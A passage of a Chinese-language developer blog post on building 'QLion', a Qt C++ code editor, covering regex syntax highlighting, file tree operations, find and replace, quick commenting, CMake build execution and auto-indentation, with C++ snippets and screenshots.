currentCodePage-&gt;<span class="hljs-built_in">setUntitledID</span>(newID);    }}</code></pre></div></div><h4 id="关闭标签页">关闭标签页</h4><p>关闭标签页时，若标签页未保存，需要提示是否进行保存。同时如果没有标签页，应当把菜单栏上复制粘贴等按钮禁用掉，也不应当进行查找替换等。</p><h4 id="行号事件响应">行号事件响应</h4><h5 id="点击事件">点击事件</h5><p>VSCode中点击行号可以跳转到对应行号，选中该行文本并将光标置于下一行。对此进行实现:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-qnrbbnlmrh9u65"></i><span>C++</span><div class="collapse show" id="collapse-qnrbbnlmrh9u65"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">mousePressEvent</span><span class="hljs-params">(QMouseEvent *event)</span> <span class="hljs-keyword">override</span></span>{    codeEditor-&gt;<span class="hljs-built_in">lineNumberAreaMousePressEvent</span>(event);}</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-lcd4rwlmrh9u65"></i><span>C++</span><div class="collapse show" id="collapse-lcd4rwlmrh9u65"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QLionCodePage::lineNumberAreaMousePressEvent</span><span class="hljs-params">(QMouseEvent *mEvent)</span> </span>{    <span class="hljs-comment">// select the current line and jump the cursor to the beginning of the next line</span>    <span class="hljs-type">int</span> clickedLineNumber=<span class="hljs-built_in">qRound</span>(mEvent-&gt;<span class="hljs-built_in">position</span>().<span class="hljs-built_in">y</span>())/<span class="hljs-built_in">fontMetrics</span>().<span class="hljs-built_in">height</span>()+<span class="hljs-built_in">verticalScrollBar</span>()-&gt;<span class="hljs-built_in">value</span>();<span class="hljs-comment">//    qDebug()&lt;&lt;clickedLineNumber;</span>    QTextBlock clickedBlock=<span class="hljs-built_in">document</span>()-&gt;<span class="hljs-built_in">findBlockByLineNumber</span>(clickedLineNumber);    <span class="hljs-function">QTextCursor <span class="hljs-title">cursor</span><span class="hljs-params">(clickedBlock)</span></span>;       cursor.<span class="hljs-built_in">movePosition</span>(QTextCursor::QTextCursor::NextBlock,QTextCursor::KeepAnchor);    <span class="hljs-built_in">setTextCursor</span>(cursor);}</code></pre></div></div><h4 id="滚动事件">滚动事件</h4><p>和TextEdit部分保持同步即可。</p><h4 id="绘制事件">绘制事件</h4><p>需要获取当前可见区域的第一个Block获取其行号。Block按照链表组织，一直next获取下一个Block直到看不见为止，绘制可见区域数字。绘制宽度和位置需要根据字体和数字位数动态调整。参见代码中<code>lineNumberAreaPaintEvent</code>部分。</p><h3 id="代码高亮">代码高亮</h3><p>代码高亮使用了QT提供的<code>QSyntaxHighlighter</code>利用正则表达式进行高亮。由于C++不是LR(1)文法，必然不能使用正则表达式进行准确的高亮。但是可以使用一些trick让高亮尽可能的准确。</p><p>这一部分需要注意的主要是:</p><ul><li>后添加的规则的高亮会覆盖掉先添加的规则</li><li>完全可以部分高亮匹配的文本，也可以为不同的部分添加不同的高亮颜色</li></ul><p>基于第一条，我们必须选择合理的顺序渲染；同时还可以弥补一些渲染上的缺陷。比如浮点数的渲染。搜索尝试了多种正则表达形式，最后采用了编译原理中编写了一条几乎适用所有浮点形式的正则表达式:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-88ucptlmrh9u65"></i><span>C++</span><div class="collapse show" id="collapse-88ucptlmrh9u65"><pre><code class="hljs C++">((([<span class="hljs-number">0</span><span class="hljs-number">-9</span>]*[.][<span class="hljs-number">0</span><span class="hljs-number">-9</span>]*([eE][+-]?[<span class="hljs-number">0</span><span class="hljs-number">-9</span>]+)?)|([<span class="hljs-number">0</span><span class="hljs-number">-9</span>]+[eE][+-]?[<span class="hljs-number">0</span><span class="hljs-number">-9</span>]+))[fLlL]?)</code></pre></div></div><p>它可以匹配<code>.xxx</code>和<code>xxx.</code>形式的浮点数，且不与变量名冲突(这也是为什么编译原理词法分析选择用这个表达式)，还能匹配科学计数法和带显式浮点格式的浮点数。但是唯一的缺陷是会把单独的点高亮。而通常在作为类成员访问符时是不高亮的。类成员的高亮规则刚好解决了这个问题。我们认为点后面加变量名这种方式作为类成员的高亮定义。又根据第二条，我们可单独为此时的点设置不同的颜色。把这条规则放到浮点数后面，就能完美的解决点高亮的问题。</p><p>第二条的其他应用比如我们可以将头文件定义作为一条规则来匹配。CLion中高亮是这样:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/QLion%E4%BB%A3%E7%A0%81%E7%BC%96%E8%BE%91%E5%99%A8/20230828210629995825_889_20230526120424273658_879_20230515214328373693_177_image-20230514210950317.png" alt="image-20230514210950317"><figcaption aria-hidden="true">image-20230514210950317</figcaption></figure><p>单独的尖括号包裹的字符串不会被高亮，只有与<code>#include</code>配合使用时才会高亮。这只有通过单一匹配规则和部分高亮实现:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ys6h0mlmrh9u65"></i><span>C++</span><div class="collapse show" id="collapse-ys6h0mlmrh9u65"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Highlighter::addIncludeFormat</span><span class="hljs-params">(<span class="hljs-type">const</span> QString &amp;text)</span> </span>{    HighlightRule rule;    rule.pattern = <span class="hljs-built_in">QRegularExpression</span>(<span class="hljs-string">R"(#include\s*[&lt;"][a-zA-Z0-9_./\\]*[&gt;"])"</span>);    <span class="hljs-function">QColor <span class="hljs-title">stringColor</span><span class="hljs-params">(<span class="hljs-number">106</span>, <span class="hljs-number">135</span>, <span class="hljs-number">89</span>)</span></span>;    <span class="hljs-function">QColor <span class="hljs-title">includeColor</span><span class="hljs-params">(<span class="hljs-number">255</span>, <span class="hljs-number">198</span>, <span class="hljs-number">109</span>)</span></span>;    rule.format.<span class="hljs-built_in">setForeground</span>(stringColor);    rule.format.<span class="hljs-built_in">setFont</span>(<span class="hljs-built_in">QFont</span>(mFontFamily, mFontSize));    QRegularExpressionMatchIterator matchIterator = rule.pattern.<span class="hljs-built_in">globalMatch</span>(text);    <span class="hljs-keyword">while</span> (matchIterator.<span class="hljs-built_in">hasNext</span>()) {        QRegularExpressionMatch match = matchIterator.<span class="hljs-built_in">next</span>();        <span class="hljs-comment">// set the "#include" to includeColor and others to stringColor</span>        <span class="hljs-built_in">setFormat</span>(match.<span class="hljs-built_in">capturedStart</span>(), <span class="hljs-number">8</span>, includeColor);        <span class="hljs-built_in">setFormat</span>(match.<span class="hljs-built_in">capturedStart</span>() + <span class="hljs-number">8</span>, match.<span class="hljs-built_in">capturedLength</span>() - <span class="hljs-number">8</span>, rule.format);    }}</code></pre></div></div><p>由于时间原因没做主题配置功能，因此颜色暂时硬编码到了代码中。</p><p>另外，不同于单行的高亮内容。若支持高亮注释，需要记录每一行的状态。QT提供了<code>setCurrentBlockState()</code>函数供我们记录行的信息。对每一行来说，如果上一行是注释，跳过检测前面的<code>/*</code>。代码实现如下:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-hqpwdhlmrh9u65"></i><span>C++</span><div class="collapse show" id="collapse-hqpwdhlmrh9u65"><pre><code class="hljs C++"><span class="hljs-comment">//notice: it was called line by line</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Highlighter::addMultiLineCommentFormat</span><span class="hljs-params">(<span class="hljs-type">const</span> QString &amp;text)</span> </span>{    <span class="hljs-comment">//mark the start of the comment</span>    <span class="hljs-built_in">setCurrentBlockState</span>(<span class="hljs-number">0</span>);    <span class="hljs-function">QRegularExpression <span class="hljs-title">startExpression</span><span class="hljs-params">(<span class="hljs-string">R"(/\*)"</span>)</span></span>;    <span class="hljs-function">QRegularExpression <span class="hljs-title">endExpression</span><span class="hljs-params">(<span class="hljs-string">R"(\*/)"</span>)</span></span>;    <span class="hljs-function">QColor <span class="hljs-title">color</span><span class="hljs-params">(<span class="hljs-number">128</span>, <span class="hljs-number">128</span>, <span class="hljs-number">128</span>)</span></span>;    QTextCharFormat multiLineCommentFormat;    multiLineCommentFormat.<span class="hljs-built_in">setForeground</span>(color);    multiLineCommentFormat.<span class="hljs-built_in">setFont</span>(<span class="hljs-built_in">QFont</span>(mFontFamily, mFontSize));    <span class="hljs-type">long</span> <span class="hljs-type">long</span> startIndex = <span class="hljs-number">0</span>;    <span class="hljs-comment">// that is, if the previous line is not a comment</span>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">previousBlockState</span>() != <span class="hljs-number">1</span>)        startIndex = startExpression.<span class="hljs-built_in">match</span>(text).<span class="hljs-built_in">capturedStart</span>();    <span class="hljs-comment">//if the previous line is a comment, we should start from the beginning of the line (startIndex=0)</span>    <span class="hljs-keyword">while</span> (startIndex &gt;= <span class="hljs-number">0</span>) {        QRegularExpressionMatch endMatch = endExpression.<span class="hljs-built_in">match</span>(text, startIndex);        <span class="hljs-type">long</span> <span class="hljs-type">long</span> endIndex = endMatch.<span class="hljs-built_in">capturedStart</span>();        <span class="hljs-type">long</span> <span class="hljs-type">long</span> commentLength = <span class="hljs-number">0</span>;        <span class="hljs-keyword">if</span> (endIndex == <span class="hljs-number">-1</span>) {            <span class="hljs-comment">// we still in a comment</span>            <span class="hljs-built_in">setCurrentBlockState</span>(<span class="hljs-number">1</span>);            commentLength = text.<span class="hljs-built_in">length</span>() - startIndex;        } <span class="hljs-keyword">else</span> {            <span class="hljs-comment">// we find the end of the comment</span>            commentLength = endIndex - startIndex + endMatch.<span class="hljs-built_in">capturedLength</span>();        }        <span class="hljs-built_in">setFormat</span>(startIndex, commentLength, multiLineCommentFormat);        startIndex = startExpression.<span class="hljs-built_in">match</span>(text, startIndex + commentLength).<span class="hljs-built_in">capturedStart</span>();    }}</code></pre></div></div><p>可以看到几乎还原了在真实代码编辑器中的显示效果。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/QLion%E4%BB%A3%E7%A0%81%E7%BC%96%E8%BE%91%E5%99%A8/20230828210630856348_646_20230526120428544516_280_20230515214329527229_954_image-20230514230623432.png" alt="image-20230514230623432"><figcaption aria-hidden="true">image-20230514230623432</figcaption></figure><h3 id="菜单栏功能">菜单栏功能</h3><h4 id="打开文件">打开文件</h4><p>打开文件是文本编辑器的基本操作。需要判断文件是否有效，保存打开路径以便下次从这个目录再寻找文件，还要判断是否需要在标签栏上区分路径。得益于面向对象和封装的思想，<code>mainwindow</code>提供打开文件的接口后，除了通过菜单栏打开文件，后续通过文件目录树打开文件，通过拖拽打开文件等都可以直接调用接口，而不必再关心怎样区分标签栏路径这样的细节。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/QLion%E4%BB%A3%E7%A0%81%E7%BC%96%E8%BE%91%E5%99%A8/20230828210633016353_975_20230526120431011874_864_20230515214330918451_552_image-20230514220624197.png" alt="image-20230514220624197"><figcaption aria-hidden="true">image-20230514220624197</figcaption></figure><h4 id="保存文件">保存文件</h4><p>在项目的设计中将保存文件交给了<code>QLionCodePage</code>，即让打开的标签页自己处理保存事件。当新建的文件保存时会产生文件路径，需要更新对应的数据结构，并区分标签页。同样的，后续运行项目，关闭标签页提示等需要用到保存操作时，不必关心实现的细节。</p><h4 id="编辑操作">编辑操作</h4><p>直接交由对应标签页处理即可。注意到若光标没有选中文本，复制会直接复制一行。</p><h4 id="查找替换操作">查找替换操作</h4><p>这一部分是查找替换功能实现后写的，获取选中文本，跳转到对应页面设置文本即可。</p><h3 id="文件目录树">文件目录树</h3><p>这一部分采用了QT中模型-视图结构。通过<code>QTreeView</code>和<code>QFileSystemModel</code>结合使用可以实现显示文件目录。<code>Treeview</code>上<code>mouseReleaseEvent</code>操作可以实现对文件的创建，重命名，删除操作。</p><p>需要注意，如果点击的<code>idx</code>无效，说明点的是空白的地方，并不是什么都不做，而是在根目录进行操作。</p><p>新建和重命名操作都是新弹出一个Widget，设置好出现的尺寸，相应回车操作。</p><p>重命名操作是其中最复杂的操作，经过多次测试才确保无误。重命名后，需要根据文件路径查找是否该文件已经在tabWidget上显示，如果显示了需要更新其路径。当然也会出现名字冲突的现象，代码中已经将其抽象为<code>distinguishFileName</code>。</p><p>拖拽操作需要重载三个<code>event</code>，其中<code>dropEvent</code>需要将文件添加到正确的位置，其他的只需要判断拖拽的是不是文件即可。</p><p>上述操作目录相关的操作需要对其下的文件进行递归操作，一开始只看到有<code>rmdir</code>这个接口，自己造了轮子结果演示的时候发现<code>build</code>目录本身删不掉。后续测试发现其他目录都是可以的。为什么呢？阅读<a href="https://doc.qt.io/qt-6/qdir.html#rmdir">文档</a>发现删除目录需要目录非空。<code>build</code>看上去是空的，但是获取文件列表的时候隐藏文件获取不到。实际上它就不是空的：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/QLion%E4%BB%A3%E7%A0%81%E7%BC%96%E8%BE%91%E5%99%A8/20230828210636167250_523_20230526120435138781_928_20230515214332155342_338_image-20230515153815269.png" alt="image-20230515153815269"><figcaption aria-hidden="true">image-20230515153815269</figcaption></figure><p>后来发现有<a href="https://doc.qt.io/qt-6/qdir.html#removeRecursively">removeRecursively</a>，这个是可以正常工作的。还是得好好看文档。</p><p>这一部分相对比较繁琐，花费时间也较长，但主要为API调用和操作逻辑为主，没有什么特别的技巧性的东西。</p><h3 id="查找替换">查找替换</h3><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/QLion%E4%BB%A3%E7%A0%81%E7%BC%96%E8%BE%91%E5%99%A8/20230828210637293661_672_20230526120441592831_476_20230515214333625979_193_image-20230514231847964.png" alt="image-20230514231847964"><figcaption aria-hidden="true">image-20230514231847964</figcaption></figure><p>首先比较坑的是需要处理好切换逻辑。可以使用<code>QActionLIst</code>完成互斥动作处理，不过由于只有两个动作，暂时直接在代码里写切换逻辑也不是不行。</p><p>查找替换的高亮(和文本选中)操作也需要更新。切换标签页时需要在新的标签栏高亮，取消旧标签栏高亮，切换到文件目录树也是如此。这需要为标签页切换额外增加槽函数。但信号的index是切换后的index，我们需要增加一变量保存切换前的index。但这个切换前的index使用时需要判断其有效性，比如关闭标签页时可能会导致保存的这个index不可用，造成内存泄漏。</p><p>高亮所有匹配目标仍旧是采用的HightLighter.为其动态额外增加高亮目标即可。不想高亮了将其设为空字符串。但是由于高亮器是按行高亮的，为关键字设置背景色时与<code>plaintextEdit</code>为当前行添加<code>extraSelection</code>可能有冲突。目前没找到好的解决方案，不过这个问题也不影响正常使用。</p><p>注意到替换文本可能会为查找位置带来偏移，一开始保存的查找到的位置可能会失效。如果Highlighter提供某个正则表达式第n个匹配位置之类的接口，这就不需要我们太担心这个问题，只需要利用highlighter实时获取位置即可。理论上现在的编辑器支持查找过程中改变文本，也是采用的实时正则匹配。但是一开始没有考虑到偏移问题，采用的是第一次查询把所有位置保存下来，后面查找直接从向量中取位置出来即可。后面发现这是一种很蠢的方案。毕竟，这些位置是编辑敏感的，编辑或替换文本后位置就变了。因此后续引入了偏移，以在替换时根据查找词长度更新位置。但是这还是没解决编辑的问题。因此查找替换时冻结了编辑页面。这样可以经过简单的偏移计算保证位置准确性。不过由于每次替换都需要更新后续所有的位置，复杂度还是很高。后来意识到没有有效利用高亮器提供的匹配功能本身就带有长度和位置信息。但是由于时间有限，这一部分并没有进行比较优雅的设计。后续再去进行调整。比较合理的思路是高亮器获取当前查找的index，高亮的过程中记录位置和匹配个数，分别发送信号给codePage和mainWindow(再传给FindReplaceView,这样设计的原因是有较明确的主从关系，而非任何两个对象都能直接交流，造成较强的耦合)去改变选中文本和查找的情况。抛开底层算法(字符串和正则匹配)的复杂性，将这一部分的业务逻辑进行合理的设计也是需要费些心思的。这也是在这个项目上面投入时间有些后悔的原因:比起业务逻辑和API调用，算法和系统设计才是我们最应当关注的地方。除开智商的因素，尽可能有意识的培养这一方面的直觉还是给常重要的。</p><h3 id="快速注释">快速注释</h3><p>快速注释可以通过按<kbd>ctrl</kbd>+<kbd>/</kbd>来注释和取消注释。看上去只是在行首添加或去掉<code>/</code>的问题，但更重要的是需要将光标恢复到原来的位置。如果处理不好将导致光标恢复到错误的位置甚至有效范围之外，导致不可预知的行为。另外需要额外处理单个<code>/</code>的情况，虽然这种情况在实际编辑中并不常见。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-11h2hklmrh9u65"></i><span>C++</span><div class="collapse show" id="collapse-11h2hklmrh9u65"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QLionCodePage::denoteCurrentLine</span><span class="hljs-params">()</span> </span>{    QTextCursor cursor = <span class="hljs-built_in">textCursor</span>();    <span class="hljs-comment">// record the current position</span>    <span class="hljs-type">int</span> position = cursor.<span class="hljs-built_in">position</span>();    <span class="hljs-type">int</span> positionInBlock = cursor.<span class="hljs-built_in">positionInBlock</span>();<span class="hljs-comment">//    qDebug() &lt;&lt; position &lt;&lt; " " &lt;&lt; positionInBlock;</span>    cursor.<span class="hljs-built_in">movePosition</span>(QTextCursor::StartOfLine);    QString text = cursor.<span class="hljs-built_in">block</span>().<span class="hljs-built_in">text</span>();    <span class="hljs-type">int</span> i;    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;text.<span class="hljs-built_in">length</span>();i++){        <span class="hljs-keyword">if</span>(text[i]==<span class="hljs-string">' '</span>||text[i]==<span class="hljs-string">'\t'</span>){            <span class="hljs-keyword">continue</span>;        }        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(text[i]==<span class="hljs-string">'/'</span>){            <span class="hljs-keyword">if</span>(i&lt;text.<span class="hljs-built_in">length</span>()<span class="hljs-number">-1</span>){                <span class="hljs-keyword">if</span>(text[i+<span class="hljs-number">1</span>]==<span class="hljs-string">'/'</span>) {                    <span class="hljs-comment">//it is a line with spaces and a double '/', remove the denotation here</span>                    cursor.<span class="hljs-built_in">movePosition</span>(QTextCursor::Right, QTextCursor::MoveAnchor, i);                    cursor.<span class="hljs-built_in">movePosition</span>(QTextCursor::Right, QTextCursor::KeepAnchor, <span class="hljs-number">2</span>);                    cursor.<span class="hljs-built_in">removeSelectedText</span>();                    <span class="hljs-keyword">if</span>(positionInBlock&lt;=i){                        <span class="hljs-comment">// if the cursor is at the left of the denotation, move the cursor to the original position</span>                        cursor.<span class="hljs-built_in">setPosition</span>(position);                    }                    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(positionInBlock==i+<span class="hljs-number">1</span>){                        <span class="hljs-comment">// if the cursor is at the middle of the denotation, move the cursor to the original position with a offset</span>                        cursor.<span class="hljs-built_in">setPosition</span>(position<span class="hljs-number">-1</span>);                    }                    <span class="hljs-keyword">else</span>{                        <span class="hljs-comment">// if the cursor is at the right of the denotation</span>                        cursor.<span class="hljs-built_in">setPosition</span>(position<span class="hljs-number">-2</span>);                    }                }                <span class="hljs-keyword">else</span>{                    <span class="hljs-comment">//it is a line with spaces and a single '/', add a single '/' here</span>                    cursor.<span class="hljs-built_in">movePosition</span>(QTextCursor::Right, QTextCursor::MoveAnchor, i+<span class="hljs-number">1</span>);                    cursor.<span class="hljs-built_in">insertText</span>(<span class="hljs-string">"/"</span>);                    <span class="hljs-keyword">if</span>(positionInBlock&lt;=i+<span class="hljs-number">1</span>){                        <span class="hljs-comment">// if the cursor is at the right of the denotation, move the cursor to the original position</span>                        cursor.<span class="hljs-built_in">setPosition</span>(position);                    }                    <span class="hljs-keyword">else</span>{                        <span class="hljs-comment">// if the cursor is at the left of the denotation, move the cursor to the original position with a offset</span>                        cursor.<span class="hljs-built_in">setPosition</span>(position+<span class="hljs-number">1</span>);                    }                }            }            <span class="hljs-keyword">else</span>{                <span class="hljs-comment">//it is a line with spaces and a single '/', add a single '/' to the end of the line</span>                cursor.<span class="hljs-built_in">movePosition</span>(QTextCursor::EndOfLine);                cursor.<span class="hljs-built_in">insertText</span>(<span class="hljs-string">"/"</span>);                cursor.<span class="hljs-built_in">setPosition</span>(position);            }            <span class="hljs-keyword">break</span>;        }        <span class="hljs-keyword">else</span>{            <span class="hljs-comment">// not start with spaces and '/', denote at the start of the line</span>            cursor.<span class="hljs-built_in">insertText</span>(<span class="hljs-string">R"(//)"</span>);            cursor.<span class="hljs-built_in">setPosition</span>(position+<span class="hljs-number">2</span>);            <span class="hljs-keyword">break</span>;        }    }    <span class="hljs-comment">// move the cursor to the original position</span>    <span class="hljs-built_in">setTextCursor</span>(cursor);}</code></pre></div></div><h3 id="cmake项目运行">Cmake项目运行</h3><p>众所周知，QT的强大之处在于跨平台。而CMake作为跨平台的构建工具，Clion为了支持跨平台也是用的CMake构建项目。我们的编辑器可以利用CMake完成平台和脚本无关的构建。我们只要设置好Cmake和构建器的路径，并交由用户自定义构建选项，CMake可以构建的项目，我们的编辑器也可以构建。</p><p><code>Qprocess</code>可以实现跨平台的命令运行。代码中定义了<code>QLionTerminal</code>类，完成可视化终端的设计并对<code>QProcess</code>类的功能进行封装。</p><p>一个Cmake项目的运行需要经历生成，构建，执行三个阶段。将这三个阶段以及空闲阶段作为状态构建枚举类，并作为<code>QLionTerminal</code>的状态机。同时在类中自定义了信号，当命令执行结束后<code>showFinished</code>槽函数被调用其功能是将命令执行状态打印到模拟终端UI上(使用PlaintextEdit实现)。并根据状态机的状态发射自定义信号给<code>mainWindow</code>，<code>mainWindow</code>根据状态判断是否要执行下一步命令，以及执行哪个命令。通过读取项目中的<code>CmakeList.txt</code>可以判断可执行对象(add_excuable)。一个项目中可能有多个可执行对象，由于时间有限只选取第一个可执行对象执行，多个对象执行的原理是一样的。若进行拓展，可读取所有可执行对象在右上角展示供用户选择(像Clion一样）。</p><p>Helloworld程序执行:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/QLion%E4%BB%A3%E7%A0%81%E7%BC%96%E8%BE%91%E5%99%A8/20230828210638486833_708_20230526120443911766_742_20230515214335038890_263_image-20230514234245615.png" alt="image-20230514234245615"><figcaption aria-hidden="true">image-20230514234245615</figcaption></figure><p>同样的道理，我们甚至可以让它构建自己:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/QLion%E4%BB%A3%E7%A0%81%E7%BC%96%E8%BE%91%E5%99%A8/20230828210640024604_748_20230526120448074383_533_20230515214336183959_219_image-20230514234354199.png" alt="image-20230514234354199"><figcaption aria-hidden="true">image-20230514234354199</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/QLion%E4%BB%A3%E7%A0%81%E7%BC%96%E8%BE%91%E5%99%A8/20230828210641025934_695_20230526120451711062_350_20230515214337928748_935_image-20230514234428154.png" alt="image-20230514234428154"><figcaption aria-hidden="true">image-20230514234428154</figcaption></figure><blockquote><p>以下内容为5.26日更新</p></blockquote><h2 id="主题配置">主题配置</h2><p>这一部分实际上实现的不是很优雅。根据软件工程的思想，我们的软件应当尽量的做到所谓的”高内聚低耦合“，并且有比较好的可拓展性。因为时间比较仓促，这里主要以功能的实现为第一要义，可拓展性做的比较差，主要表现在以下几个方面:</p><ul><li>主题的颜色，字体，风格等配置最好应当以配置文件的方式存在，目前是硬编码到了代码中。</li><li>当前用布尔值表示主题的切换。比如“我想要一个浅色的主题但又不喜欢朋克风”这种问题就会让我很尴尬。这样做若后续进行主题的增加甚至允许用户自定义主题，就需要改动较多的代码。不过鉴于这个项目也是写着玩的(我想没人会真的用这破玩意写代码)，<code>fancy</code>一些的主题就算是增添乐趣吧。</li></ul><h2 id="自动缩进">自动缩进</h2><p>这一部分看上去比较复杂，实际上需要考虑的因素也不少，但没有那么难。这一部分首先要做的是重写<code>keyPressEvent</code>识别按键，然后根据不同的按键结合上下文因素实现自动缩进。这里就以<code>{}</code>为例吧。</p><p>我们让<code>closeParenthesis</code>处理这件事，它包装了各种类型括号的操作。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-wesc1tlmrh9u65"></i><span>C++</span><div class="collapse show" id="collapse-wesc1tlmrh9u65"><pre><code class="hljs C++"><span class="hljs-keyword">if</span> (event-&gt;<span class="hljs-built_in">key</span>() == Qt::Key_BraceLeft) {    <span class="hljs-built_in">closeParenthesis</span>(<span class="hljs-string">"{"</span>, <span class="hljs-string">"}"</span>);    <span class="hljs-keyword">return</span>;}</code></pre></div></div><p><code>closeParenthesis</code>代码比较长。说一下主要思路，代码不看也行。首先我们需要判断是否有选中的文本。若有，那好说，直接用括号包住就可以了。对于<code>{}</code>，如果是紧跟在函数定义语句后面，证明我们要写函数体了，需要缩进一下。如果不是，那么可能是数组初始化之类的操作，我们就把括号补齐，移动光标到中间。其他的也是同理。</p><p>其中的<code>getIndentation</code>函数虽然短，但是是是实现自动缩进的核心。放代码:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-fzhwxmlmrh9u65"></i><span>C++</span><div class="collapse show" id="collapse-fzhwxmlmrh9u65"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">QLionCodePage::getIndentation</span><span class="hljs-params">(QTextCursor cursor)</span> </span>{    <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> prevLineText = cursor.<span class="hljs-built_in">block</span>().<span class="hljs-built_in">previous</span>().<span class="hljs-built_in">text</span>();    <span class="hljs-type">int</span> n = <span class="hljs-built_in">leadingSpaces</span>(prevLineText);    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isEndingBraceOrColon</span>(prevLineText)) {        n += <span class="hljs-number">4</span>;    }    <span class="hljs-keyword">return</span> n;}</code></pre></div></div><p>我们获取前面一行，看有多少缩进。<code>leadingSpaces</code>处理了空格和<code>tab</code>缩进的情况。虽然我们在代码编辑器中将<code>tab</code>映射为四个空格，但不敢保证源文件里就没有。我们还要对tab进行讨论以及让它正常显示。</p><p>接下来<code>isEndingBraceOrColon</code>的作用是如果发现以<code>{</code>或<code>:</code>末尾的话，说明有新的类或函数声明，下面就要多缩进一级。最后返回的值是光标所在的一行需要缩进的字符数。</p><p>下面是<code>closeParenthesis</code>的完整代码，可以结合上面提到的思路阅读。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-7mbobblmrh9u65"></i><span>C++</span><div class="collapse show" id="collapse-7mbobblmrh9u65"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QLionCodePage::closeParenthesis</span><span class="hljs-params">(<span class="hljs-type">const</span> QString &amp;startStr, <span class="hljs-type">const</span> QString &amp;endStr)</span> </span>{    <span class="hljs-keyword">auto</span> cursor = <span class="hljs-built_in">textCursor</span>();    <span class="hljs-keyword">if</span> (cursor.<span class="hljs-built_in">hasSelection</span>()) {        <span class="hljs-keyword">auto</span> start = cursor.<span class="hljs-built_in">selectionStart</span>();        <span class="hljs-keyword">auto</span> end = cursor.<span class="hljs-built_in">selectionEnd</span>();        cursor.<span class="hljs-built_in">setPosition</span>(start, cursor.MoveAnchor);        cursor.<span class="hljs-built_in">insertText</span>(startStr);        cursor.<span class="hljs-built_in">setPosition</span>(end + startStr.<span class="hljs-built_in">size</span>(), cursor.MoveAnchor);        cursor.<span class="hljs-built_in">insertText</span>(endStr);    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (startStr == <span class="hljs-string">"{"</span>) {        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">checkCharacterBefore</span>(<span class="hljs-string">")"</span>)) {            <span class="hljs-comment">// only need to auto indent when the previous character is ')', which means it is a function</span>            <span class="hljs-keyword">auto</span> pos = cursor.<span class="hljs-built_in">position</span>();            cursor.<span class="hljs-built_in">setPosition</span>(pos, cursor.MoveAnchor);            cursor.<span class="hljs-built_in">insertText</span>(<span class="hljs-string">"{\n"</span>);            <span class="hljs-type">int</span> indentation = <span class="hljs-built_in">getIndentation</span>(cursor);            cursor.<span class="hljs-built_in">insertText</span>(<span class="hljs-built_in">QString</span>(<span class="hljs-string">" "</span>).<span class="hljs-built_in">repeated</span>(indentation));            cursor.<span class="hljs-built_in">insertText</span>(<span class="hljs-string">"\n"</span>);            cursor.<span class="hljs-built_in">insertText</span>(<span class="hljs-built_in">QString</span>(<span class="hljs-string">" "</span>).<span class="hljs-built_in">repeated</span>(indentation - <span class="hljs-number">4</span>));            cursor.<span class="hljs-built_in">insertText</span>(<span class="hljs-string">"}"</span>);            cursor.<span class="hljs-built_in">setPosition</span>(pos + <span class="hljs-number">2</span> + indentation, cursor.MoveAnchor);        } <span class="hljs-keyword">else</span> {            <span class="hljs-keyword">auto</span> pos = cursor.<span class="hljs-built_in">position</span>();            cursor.<span class="hljs-built_in">setPosition</span>(pos, cursor.MoveAnchor);            cursor.<span class="hljs-built_in">insertText</span>(startStr + endStr);            cursor.<span class="hljs-built_in">setPosition</span>(pos + <span class="hljs-number">1</span>, cursor.MoveAnchor);        }    } <span class="hljs-keyword">else</span> {        <span class="hljs-keyword">auto</span> pos = cursor.<span class="hljs-built_in">position</span>();        cursor.<span class="hljs-built_in">setPosition</span>(pos, cursor.MoveAnchor);        cursor.<span class="hljs-built_in">insertText</span>(startStr + endStr);        cursor.<span class="hljs-built_in">setPosition</span>(pos + <span class="hljs-number">1</span>, cursor.MoveAnchor);    }    <span class="hljs-built_in">setTextCursor</span>(cursor);}</code></pre></div></div><h2 id="单元测试及收获">单元测试及收获</h2><p>如<a 